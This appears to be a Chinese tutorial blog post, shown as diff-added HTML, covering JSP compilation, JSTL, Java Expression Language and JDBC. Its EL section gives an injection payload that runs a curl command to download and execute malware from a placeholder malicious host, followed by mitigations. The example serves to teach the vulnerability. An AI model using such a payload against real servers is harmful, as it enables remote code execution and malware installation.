+      <span class="k">if</span> <span class="o">(!(</span><span class="n">t</span> <span class="k">instanceof</span> <span class="n">javax</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">jsp</span><span class="o">.</span><span class="na">SkipPageException</span><span class="o">)){</span>
+        <span class="n">out</span> <span class="o">=</span> <span class="n">_jspx_out</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">out</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">out</span><span class="o">.</span><span class="na">getBufferSize</span><span class="o">()</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span>
+          <span class="k">try</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">response</span><span class="o">.</span><span class="na">isCommitted</span><span class="o">())</span> <span class="o">{</span>
+              <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+              <span class="n">out</span><span class="o">.</span><span class="na">clearBuffer</span><span class="o">();</span>
+            <span class="o">}</span>
+          <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{}</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">_jspx_page_context</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="n">_jspx_page_context</span><span class="o">.</span><span class="na">handlePageException</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
+        <span class="k">else</span> <span class="k">throw</span> <span class="k">new</span> <span class="n">ServletException</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
+      <span class="o">}</span>
+    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+      <span class="n">_jspxFactory</span><span class="o">.</span><span class="na">releasePageContext</span><span class="o">(</span><span class="n">_jspx_page_context</span><span class="o">);</span>
+    <span class="o">}</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div><p>代码有点长，其中有几个重点:</p>
+<ul>
+<li>生成的类名与 jsp 文件名相同，不合法的字符会转换为 <code>_</code>，比如 <code>index.jsp</code> 会生成 <code>index_jsp</code>， <code>1.jsp</code> 会生成 <code>_1_jsp</code>；</li>
+<li>生成的 Java 类继承自抽象类 <a href="https://github.com/guang19/framework-learning/blob/master/tomcat9.0-source/java/org/apache/jasper/runtime/HttpJspBase.java#L37" target="_blank" rel="noopener noreffer ">HttpJspBase</a>，这个类继承自 <code>HttpServlet</code>；</li>
+<li><code>_jspInit</code>、<code>_jspDestory</code> 对应 Servlet 中的生命周期函数；<code>_jspService</code> 中处理客户端的请求，JSP 中的 Java 代码也会转移到这里；</li>
+</ul>
+<p>该类在第一次访问的时候才会生成、编译、加载，因此对于没访问过的页面是没有对应文件的。另外，在 <code>_jspService</code> 方法中为了方便 JSP 的代码编写，定义了几个常用的对象，比如:</p>
+<ol>
+<li>request，对应客户端请求的 <code>HttpServletRequest</code> 对象；</li>
+<li>response，对应返回的 <code>HttpServletResponse</code> 对象；</li>
+<li>session，对应 <code>HttpSession</code>，存储当前请求会话信息；</li>
+<li>application，对应 <code>ServletContext</code>，用于全局共享数据；</li>
+<li>config，对应 <code>ServletConfig</code> 即 Servlet 的配置对象；</li>
+<li>page，为 <code>Object</code> 类型，指向当前 Servlet 对象；</li>
+<li>out，即控制页面输出的 <code>JspWriter</code>；</li>
+<li>pageContext，当前页面共享数据对象；</li>
+</ol>
+<p>这几个对象通常称为 JSP 的 “八大对象”，或者 “九大对象” (算上 <code>exception</code> 对象)。”</p>
+<p>这是一个由 Apache Jasper 编译器自动生成的 Java 文件，它是将一个 JSP 文件（Java Server Pages）转换为 Servlet 类的结果。这段代码主要是将 JSP 文件转换为 Servlet，以便在 Java Web 应用程序中处理客户端请求和响应。这个特定的 JSP 文件只包含一个简单的 HTML 标题，显示 Servlet 配置信息。</p>
+<h3 id="标签库与-jstl">标签库与 JSTL</h3>
+<p>“前面介绍 JSP 语法的时候提到过 <a href="https://www.tutorialspoint.com/jsp/jsp_directives.htm" target="_blank" rel="noopener noreffer ">directive</a> 的语法，即 <code>&lt;%@ directive attribute=&quot;value&quot; %&gt;</code>。在 JSP 中有三种指令类型，分别是:</p>
+<ol>
+<li><code>&lt;%@ page ... %&gt;</code> 用于定义页面相关的属性，比如脚本语言类型、错误页面和缓存等；</li>
+<li><code>&lt;%@ include ... %&gt;</code> 用语言在脚本翻译阶段包含其他文件；</li>
+<li><code>&lt;%@ taglib ... %&gt;</code> 引入标签库的定义；</li>
+</ol>
+<p>其中标签(tag)是指的是在 JSP 中一个可重用的动态组件，类似于 HTML 或者 XML 的标签，只不过多用于生成动态内容。<code>taglib</code> 就是一系列自定义标签的集合。<a href="https://www.tutorialspoint.com/jsp/jsp_custom_tags.htm" target="_blank" rel="noopener noreffer ">JSP 支持让用户自定义标签</a>，同时也提供了标准的标签库来方便开发，这个标准库就是 JSTL。JSTL 中常见的标签库有下面这些:</p>
+<ul>
+<li>核心标签库 (uri=&quot;http://java.sun.com/jsp/jstl/core”)
+<ul>
+<li><code>&lt;c:out&gt;</code> - 输出字符串</li>
+<li><code>&lt;c:if&gt;</code> - 条件处理</li>
+<li><code>&lt;c:forEach&gt;</code> - 集合遍历</li>
+</ul>
+</li>
+<li>格式化标签库 (uri=&quot;http://java.sun.com/jsp/jstl/fmt”)
+<ul>
+<li><code>&lt;fmt:message&gt;</code> - 格式化并显示消息</li>
+<li><code>&lt;fmt:formatDate&gt;</code> - 格式化日期</li>
+</ul>
+</li>
+<li>SQL 标签库 (uri=&quot;http://java.sun.com/jsp/jstl/sql”)
+<ul>
+<li><code>&lt;sql:setDataSource&gt;</code> - 指定数据源并使其可用于 SQL 操作</li>
+<li><code>&lt;sql:query&gt;</code> - 执行 SQL 查询并迭代结果集</li>
+<li><code>&lt;sql:update&gt;</code> - 通过执行 SQL 语句更新数据源</li>
+</ul>
+</li>
+<li>XML 标签库（uri=&quot;http://java.sun.com/jsp/jstl/xml”）
+<ul>
+<li><code>&lt;x:parse&gt;</code> - 解析 XML 文档</li>
+<li><code>&lt;x:forEach&gt;</code> - 遍历 XML 文档</li>
+<li><code>&lt;x:out&gt;</code> - 输出结果</li>
+</ul>
+</li>
+<li>函数标签库 (uri=&quot;http://java.sun.com/jsp/jstl/functions”)</li>
+</ul>
+<p>关于这些标签库提供的完整功能可以参考官方文档 <a href="https://docs.oracle.com/javaee/5/jstl/1.1/docs/tlddocs/" target="_blank" rel="noopener noreffer ">JavaServer Pages Standard Tag Library 1.1 Tag Reference</a>。一个使用核心标签库的示例 JSP 如下所示:</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot; %&gt;
+&lt;%@ taglib uri=&quot;http://java.sun.com/jsp/jstl/core&quot; prefix=&quot;c&quot; %&gt;
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;JSTL c:out Example&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt; &lt;c:out value=&quot;1+1=${1+1}&quot;/&gt; &lt;/h2&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>这是一个使用 JSTL（JavaServer Pages Standard Tag Library）的简单 JSP 页面示例，主要展示了如何使用 JSTL 的 <code>c:out</code> 标签。以下是对这段代码的解读：</p>
+<ol>
+<li><code>&lt;%@ page ... %&gt;</code> 是一个 JSP 指令，用于设置页面的属性，如 <code>contentType</code> 和 <code>pageEncoding</code>。这里，它设置了响应的内容类型为 <code>text/html; charset=UTF-8</code>，并指定了 JSP 页面的编码方式为 UTF-8。</li>
+<li><code>&lt;%@ taglib ... %&gt;</code> 是另一个 JSP 指令，用于导入 JSTL 标签库。在这个例子中，它导入了 JSTL 核心库（<code>http://java.sun.com/jsp/jstl/core</code>），并为这个库指定了一个前缀 <code>c</code>，这样就可以使用这个前缀来调用 JSTL 标签。</li>
+<li><code>&lt;html&gt;</code>、<code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签定义了 HTML 文档的基本结构。<code>&lt;head&gt;</code> 标签中包含了元数据（如标题），而 <code>&lt;body&gt;</code> 标签中包含了要呈现给用户的实际内容。</li>
+<li><code>&lt;title&gt;JSTL c:out Example&lt;/title&gt;</code> 设置了页面的标题。</li>
+<li><code>&lt;h2&gt; &lt;c:out value=&quot;1+1=${1+1}&quot;/&gt; &lt;/h2&gt;</code> 输出一个 HTML 标题。在这里，我们使用了 JSTL 的 <code>c:out</code> 标签，它的主要功能是对输出的文本进行转义，以防止跨站脚本攻击（XSS）。<code>value</code> 属性用于指定要输出的文本。在这个例子中，我们使用了 JSP 表达式 <code>${1+1}</code> 计算 1+1 的结果，并将其插入到输出文本中。因此，生成的 HTML 代码将显示一个标题，内容为：<code>1+1=2</code>。</li>
+</ol>
+<p>这个 JSP 页面主要展示了如何使用 JSTL 的 <code>c:out</code> 标签来输出内容。当 Web 容器接收到一个请求并将其转发给这个 JSP 页面时，容器会将 JSP 转换为 Java Servlet 代码，处理请求并生成响应。在这个例子中，响应将包含一个显示计算结果的 HTML 标题。</p>
+<p>以下是一个关于 JSP 工作原理的简要说明：</p>
+<ol>
+<li>客户端（如浏览器）向 Web 服务器发送 HTTP 请求。</li>
+<li>Web 服务器将请求转发给 JSP 容器（如 Tomcat 或其他支持 JSP 的容器）。</li>
+<li>如果这是请求的 JSP 页面的第一次访问，JSP 容器将 JSP 页面转换为 Java Servlet 代码。</li>
+<li>Java Servlet 代码被编译成 Java 字节码（即 .class 文件）。</li>
+<li>JSP 容器执行 Servlet 字节码，处理请求并生成动态 HTML 内容。</li>
+<li>动态 HTML 内容被发送回 Web 服务器。</li>
+<li>Web 服务器将生成的 HTML 发送给客户端作为 HTTP 响应。</li>
+</ol>
+<p>下面是一个示意图，展示了 JSP 的工作原理：</p>
+<pre><code>+---------+  HTTP Request   +-----------+  Forward Request   +-------------+
+|         +-----------------&gt;           +-------------------&gt;              |
+| Browser |                 | Web Server|                    |JSP Container|
+|         &lt;-----------------+           &lt;-------------------+              |
++---------+  HTTP Response  +-----------+   Return Response  +-------------+
+</code></pre><p>“<code>c:out</code> 的输出类似于 <code>&lt;%=</code> 的输出，只不过前者是针对表达式，关于表达式在后文中会另外进行介绍。</p>
+<p>注意在 Tomcat 或者 Jetty 这种轻量级的容器内使用 JSTL 需要安装对应的依赖，可以参考 <a href="https://stackoverflow.com/tags/jstl/info" target="_blank" rel="noopener noreffer ">JSTL - Stackoverflow</a> 中的相关介绍。</p>
+<p>虽然在前后端分离的开发浪潮中 JSP 似乎已经日渐式微，但在网站快速原型开发中 JSP 还占有一席之地，而且许多历史项目也是基于 JSP 进行开发，因此对其了解还是有必要的。”</p>
+<h2 id="java-表达式语言">Java 表达式语言</h2>
+<p>“上节中我们说到 JSP 的标准中包含了两份文档，一份是 JSP 语言本身的标准，另一份则是表达式语言的标准。Java 表达式语言即 Expression Language，简称为 EL，最初就是为了在 JSTL 中使用便捷的表达式解析而出现的。虽然 JSP 中可以写 Java 代码，但这一方面对不懂 Java 语言的人不太友好，另一方面很多时候我们仅需要在 JSP 中执行比较、循环、加减乘除等简单操作，而引入完整的 Java 引擎显得有点 overkill 了。</p>
+<p>在最初的版本中，<a href="https://en.wikipedia.org/wiki/Jakarta_Expression_Language" target="_blank" rel="noopener noreffer ">Java EL</a> 被称为 <code>SPEL</code>(Simplest Possible Expression Language) 或者 <code>JUEL</code>(Java Unified Expression Language)，注意不要和 Spring 的 <code>SpEL</code>(Spring Expression Language) 搞混。EL 的语法被设计得和 <code>javascript</code> 类似，比如:</p>
+<ul>
+<li>无法强制类型转换，转换过程是隐式的；</li>
+<li>单引号和双引号等价；</li>
+<li><code>object.property</code> 和 <code>object['property']</code> 实现的效果基本相同；</li>
+<li>抽象属性的类型，<code>object.property</code> 根据属性的类型不同，实际上可能会调用 <code>object.get(&quot;property&quot;)</code>、<code>object.getProperty(&quot;property&quot;)</code> 或者 <code>object.getProperty()</code> 等；</li>
+</ul>
+<p>EL 的标准也经过了多个版本的迭代，在 <a href="https://download.oracle.com/otn-pub/jcp/jsp-2.1-fr-eval-spec-oth-JSpec/jsp-2_1-fr-spec-el.pdf" target="_blank" rel="noopener noreffer ">EL 2.1 版本</a>时，为了综合考虑 JSF 等技术的需要，对 EL 的功能进行了拓展，比如增加了延迟表达式(Deferred expressions)，使得表达式不用在 JSP 翻译的过程就被执行；另外提供了 get/set 去获取/修改对象属性的能力，以及方法表达式支持调用 Java 对象的方法。</p>
+<p><a href="https://jcp.org/en/jsr/detail?id=341" target="_blank" rel="noopener noreffer ">EL 3.0</a> 中正式将 EL 的标准从 JSP/JSF 的标准中独立出来，编号为 JSR-341。这个版本中在 EL 中增加了类似 Java8 Stream 和 lambda 表达式的功能，几个简单的示例如下:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ELTestServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">res</span><span class="o">)</span>
+            <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        
+        <span class="n">List</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Double</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">1</span><span class="o">.</span><span class="na">0</span><span class="o">));</span>
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Double</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">2</span><span class="o">.</span><span class="na">0</span><span class="o">));</span>
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">Double</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">3</span><span class="o">.</span><span class="na">0</span><span class="o">));</span>
+
+        <span class="n">ELProcessor</span> <span class="n">elp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ELProcessor</span><span class="o">();</span>
+        <span class="n">elp</span><span class="o">.</span><span class="na">defineBean</span><span class="o">(</span><span class="s">&#34;data&#34;</span><span class="o">,</span> <span class="n">list</span><span class="o">);</span>    
+
+        <span class="n">Object</span> <span class="n">message</span> <span class="o">=</span> <span class="o">(</span><span class="n">Double</span><span class="o">)</span><span class="n">elp</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span>
+            <span class="s">&#34;n = data.stream().count(); s = data.stream().sum(); sq = data.stream().map(i -&gt; i*i).sum(); Math.sqrt(sq/n - Math.pow(s/n, 2))&#34;</span><span class="o">);</span>
+        <span class="n">res</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="n">message</span><span class="o">);</span>
+
+        <span class="n">message</span> <span class="o">=</span> <span class="o">(</span><span class="n">Double</span><span class="o">)</span><span class="n">elp</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span>
+            <span class="s">&#34;n = 0; s = 0; sq = 0; data.stream().forEach(d -&gt; (n = n + 1; s = s + d; sq = sq + d*d)); Math.sqrt(sq/n - Math.pow(s/n, 2))&#34;</span><span class="o">);</span>
+        <span class="n">res</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="n">message</span><span class="o">);</span>
+
+        <span class="n">message</span> <span class="o">=</span> <span class="o">(</span><span class="n">Double</span><span class="o">)</span><span class="n">elp</span><span class="o">.</span><span class="na">eval</span><span class="o">(</span>
+            <span class="s">&#34;n = 0; s = 0; sq = data.stream().reduce(0, (a, i) -&gt; (n = n + 1; s = s + i; a + i*i)); Math.sqrt(sq/n - Math.pow(s/n, 2))&#34;</span><span class="o">);</span> 
+        <span class="n">res</span><span class="o">.</span><span class="na">getWriter</span><span class="o">().</span><span class="na">println</span><span class="o">(</span><span class="n">message</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+
+</code></pre></div><p>目前最新的 EL 标准是 2020 年 4.0 版本，这个版本中将包名从 <code>javax.el</code> 移到了 <code>jakarta.el</code>。除了 Java EE 中定义的 EL 表达式标准和实现，在许多三方库中也实现了类似的表达式语言功能，包括但不限于:</p>
+<ul>
+<li><a href="https://github.com/orphan-oss/ognl" target="_blank" rel="noopener noreffer ">OGNL</a>: Object-Graph Navigation Language，一个开源的表达式语言实现，在许多其他项目中被使用，比如 Struts2、Spring Web Flow、MyBatis、FreeMarker 等；</li>
+<li><a href="https://github.com/mvel/mvel" target="_blank" rel="noopener noreffer ">MVEL</a>: MVFLEX Expression Language，另一个开源的表达式语言实现，一些知名的 Java 项目使用其作为表达式引擎，比如 JBoss Drools、Hibernate ORM、JIRA 等；</li>
+<li><a href="https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions" target="_blank" rel="noopener noreffer ">SpEL</a>: Spring 框架中使用的表达式语言，除了 Spring 宇宙中的组件，还有其他 Java 项目也是用了该引擎，比如 Thymeleaf、Apache Camel、Apache Sling 等；</li>
+<li><a href="https://commons.apache.org/proper/commons-jexl/" target="_blank" rel="noopener noreffer ">JEXL</a>: 即 Apache Commons JEXL(Java EXpression Language)，参考 Java EL 和 Apache Velocity 实现的一个表达式语言，语法接近于 JavaScript 和 Shell 脚本；</li>
+</ul>
+<p>这类表达式语言通常作为模版语言在 Web 页面中使用，如果其中的表达式能够被恶意输入所控制，就可能出现任意代码执行的危害。历史上出现过许多由于 EL 表达式注入导致的远程代码执行，因此这算是 Java 中高危的攻击面之一。”</p>
+<p>表达式语言（EL）注入是一种安全漏洞，攻击者可以利用这个漏洞执行恶意代码。以下是一个使用 Java 服务器页面（JSP）技术的示例，其中的 EL 表达式存在安全漏洞，可能导致远程代码执行。</p>
+<p>假设我们有一个简单的 JSP 页面，用于显示用户的昵称。页面代码如下：</p>
+<pre><code class="language-jsp" data-lang="jsp">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;用户昵称&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;欢迎，${nickname}！&lt;/h1&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>在这个例子中，<code>nickname</code> 是一个来自用户输入的字符串。如果开发者没有对用户输入进行适当的过滤和验证，攻击者可能会插入恶意的表达式语言代码。</p>
+<p>例如，攻击者可以将 <code>nickname</code> 的值设置为 <code>${8 * 8}</code>。如果 JSP 引擎没有限制表达式语言的执行，页面将显示“欢迎，64！”，这表明攻击者成功地执行了 EL 代码。</p>
+<p>虽然这个例子中的攻击相对无害，但攻击者可能会尝试执行更复杂的代码，从而导致远程代码执行。以下是一个更危险的例子：</p>
+<p>攻击者将 <code>nickname</code> 的值设置为 :</p>
+<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">${request.getClass().getClassLoader().loadClass(&#39;java.lang.Runtime&#39;).getDeclaredMethods()[0].invoke(null).exec(&#39;curl http://malicious.com/malware -o /tmp/malware <span class="err">&amp;&amp;</span> chmod +x /tmp/malware <span class="err">&amp;&amp;</span> /tmp/malware&#39;)}
+</code></pre></div><p>在这个例子中，攻击者利用 EL 注入执行了以下操作：</p>
+<ol>
+<li>通过 <code>request.getClass().getClassLoader().loadClass('java.lang.Runtime')</code> 加载 <code>java.lang.Runtime</code> 类。</li>
+<li>使用 <code>getDeclaredMethods()[0]</code> 获取 <code>Runtime</code> 类的第一个方法（通常是 <code>getRuntime()</code>）。</li>
+<li>使用 <code>invoke(null)</code> 调用该方法，获取 <code>Runtime</code> 实例。</li>
+<li>使用 <code>exec()</code> 方法执行恶意 shell 命令，从恶意网站下载恶意软件，并在目标服务器上执行。</li>
+</ol>
+<p>为了防止 EL 注入攻击，应采取以下安全措施：</p>
+<ol>
+<li>
+<p>禁用或限制表达式语言的功能。例如，在 JSP 2.0 中，可以通过在 web.xml 文件中添加以下配置来禁用表达式语言：</p>
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;jsp-config&gt;</span>
+    <span class="nt">&lt;jsp-property-group&gt;</span>
+        <span class="nt">&lt;url-pattern&gt;</span>*.jsp<span class="nt">&lt;/url-pattern&gt;</span>
+        <span class="nt">&lt;el-ignored&gt;</span>true<span class="nt">&lt;/el-ignored&gt;</span>
+    <span class="nt">&lt;/jsp-property-group&gt;</span>
+<span class="nt">&lt;/jsp-config&gt;</span>
+</code></pre></div></li>
+<li>
+<p>对用户输入进行验证和过滤。确保只接受预期的值，避免接受潜在的恶意代码。</p>
+</li>
+<li>
+<p>使用安全编码库，如 OWASP Java Encoder，对用户输入进行安全的 HTML 编码，以防止恶意代码被执行。</p>
+</li>
+</ol>
+<p>注意，这个示例特定于 Java 服务器页面技术和 EL 注入。类似的漏洞可能存在于其他语言和框架中，因此在处理用户输入和表达式时应始终保持警惕。</p>
+<h2 id="jdbc">JDBC</h2>
+<p>“在传统 MVC 架构中，将内容呈现的过程分成模型(Model)，视图(View)，控制器(Controller)三个部分，现在我们已经介绍了控制器部分的 Servlet，视图层的 JSP，为了使得一个网页能够真正有价值，还缺少其中关键的模型部分，即数据来源。</p>
+<p>JDBC (Java Database Connectivity) 就是 Java 访问数据库的一个标准。历史上在 JDK 1.1 中 JDBC 就已经是其中的一部分，也就是说 JDBC 本身也是 Java SE 的标准，但也包含在 Java EE 中。其包名可通过 <code>java.sql</code> 或者 <code>javax.sql</code> 进行访问。</p>
+<p>JDBC 标准现在由 JCP 维护，主要经过以下几个版本的迭代:</p>
+<ul>
+<li><a href="https://jcp.org/en/jsr/detail?id=54" target="_blank" rel="noopener noreffer ">JSR 54: JDBC 3.0 Specification</a> (J2SE 1.4)</li>
+<li><a href="https://jcp.org/en/jsr/detail?id=114" target="_blank" rel="noopener noreffer ">JSR 114: JDBC Rowset Implementations</a></li>
+<li><a href="https://jcp.org/en/jsr/detail?id=221" target="_blank" rel="noopener noreffer ">JSR 221: JDBC 4.0 API Specification</a> (Java SE 6)</li>
+<li>JSR 221 Release 1: JDBC 4.1 (Java SE 7)</li>
+<li>JSR 221 Release 2: JDBC 4.2 (Java SE 8)</li>
+<li>JSR 221 Release 3: JDBC 4.3 (Java SE 9)</li>
+</ul>
+<p>不同版本的 JDBC 主要引进了一些新的特性，比如 JDBC 4.0 支持自动加载数据库驱动，4.1 支持 try-with-resource，大对象(LOB)更新等；主要的框架并没有太大变化。”</p>
+<p>JDBC（Java Database Connectivity）是一个 Java API，它提供了一种与关系数据库进行交互的标准方法。JDBC 允许开发者通过 JDBC 驱动程序连接到各种数据库，执行 SQL 语句并处理查询结果。JDBC 是 Java 标准版（Java SE）的一部分，并遵循一套通用的接口和类，使得开发者可以轻松地在不同的数据库之间切换。</p>
+<p>以下是 JDBC 的主要组件：</p>
+<ol>
+<li><strong>驱动程序（Driver）</strong>：JDBC 驱动程序是一个实现了 JDBC 接口的软件库，它允许 Java 应用程序与特定数据库引擎进行通信。大多数数据库提供商都提供了自己的 JDBC 驱动程序。</li>
+<li><strong>连接（Connection）</strong>：这是一个表示 Java 应用程序与数据库之间的会话的对象。要创建连接，您需要提供数据库的 URL、用户名和密码。连接对象可用于创建用于执行 SQL 语句的 Statement、PreparedStatement 和 CallableStatement 对象。</li>
+<li><strong>Statement</strong>：Statement 对象用于在数据库上执行静态 SQL 语句。您可以使用 Statement 对象执行 INSERT、UPDATE、DELETE 和 SELECT 语句。</li>
+<li><strong>PreparedStatement</strong>：与 Statement 类似，PreparedStatement 用于执行预编译的 SQL 语句，可以包含参数占位符。使用 PreparedStatement 可以提高性能并防止 SQL 注入攻击。</li>
+<li><strong>CallableStatement</strong>：这个对象用于执行存储过程和函数。它提供了设置输入参数和获取输出参数的方法。</li>
+<li><strong>ResultSet</strong>：表示数据库查询结果集的对象。您可以使用 ResultSet 对象遍历查询结果，并获取每一行的列值。</li>
+</ol>
+<p>以下是一个使用 JDBC 连接到 MySQL 数据库并执行简单查询的示例：</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"><span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.sql.ResultSet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.sql.Statement</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JdbcExample</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">url</span> <span class="o">=</span> <span class="s">&#34;jdbc:mysql://localhost:3306/mydatabase&#34;</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">user</span> <span class="o">=</span> <span class="s">&#34;username&#34;</span><span class="o">;</span>
+        <span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="s">&#34;password&#34;</span><span class="o">;</span>
+
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// 1. 加载驱动程序
+</span><span class="c1"></span>            <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;com.mysql.cj.jdbc.Driver&#34;</span><span class="o">);</span>
+
+            <span class="c1">// 2. 建立数据库连接
+</span><span class="c1"></span>            <span class="n">Connection</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="n">url</span><span class="o">,</span> <span class="n">user</span><span class="o">,</span> <span class="n">password</span><span class="o">);</span>
+
+            <span class="c1">// 3. 创建 Statement 对象
+</span><span class="c1"></span>            <span class="n">Statement</span> <span class="n">statement</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="na">createStatement</span><span class="o">();</span>
+
+            <span class="c1">// 4. 执行 SQL 查询并获取结果集
+</span><span class="c1"></span>            <span class="n">ResultSet</span> <span class="n">resultSet</span> <span class="o">=</span> <span class="n">statement</span><span class="o">.</span><span class="na">executeQuery</span><span class="o">(</span><span class="s">&#34;SELECT * FROM users&#34;</span><span class="o">);</span>
+
+            <span class="c1">// 5. 处理结果集
+</span><span class="c1"></span>            <span class="k">while</span> <span class="o">(</span><span class="n">resultSet</span><span class="o">.</span><span class="na">next</span><span class="o">())</span> <span class="o">{</span>
+                <span class="kt">int</span> <span class="n">id</span> <span class="o">=</span> <span class="n">resultSet</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="s">&#34;id&#34;</span><span class="o">);</span>
+                <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">resultSet</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">);</span>
+                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;用户 ID: &#34;</span> <span class="o">+</span> <span class="n">id</span> <span class="o">+</span> <span class="s">&#34;, 用户名: &#34;</span> <span class="o">+</span> <span class="n">name</span><span class="o">);</span>
+            <span class="o">}</span>
+
+            <span class="c1">// 6. 关闭资源
+</span><span class="c1"></span>            <span class="n">resultSet</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">statement</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">connection</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SQLException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div><p>在实际开发中，为了更好地管理资源和错误处理，通常会使用连接池、事务管理和 ORM 框架（如 Hibernate、MyBatis 等）。总之，JDBC 是 Java 应用程序与关系数据库进行交互的重要 API。通过使用 JDBC，开发者可以编写跨多种数据库的通用代码，简化数据库操作并确保数据的安全性。</p>
+<p>“JDBC API 的常见用法如下:</p>
+<div class="highlight"><pre class="chroma"><code class="language-java" data-lang="java"> <span class="kn">import</span> <span class="nn">java.sql.*</span><span class="o">;</span>
+
+ <span class="kd">public</span> <span class="kd">class</span> <span class="nc">TestJdbc</span> <span class="o">{</span>
+   <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+     <span class="c1">// Class.forName(&#34;com.mysql.jdbc.Driver&#34;);
+</span><span class="c1"></span>
+     <span class="c1">// 1. Establishing the connection with the database
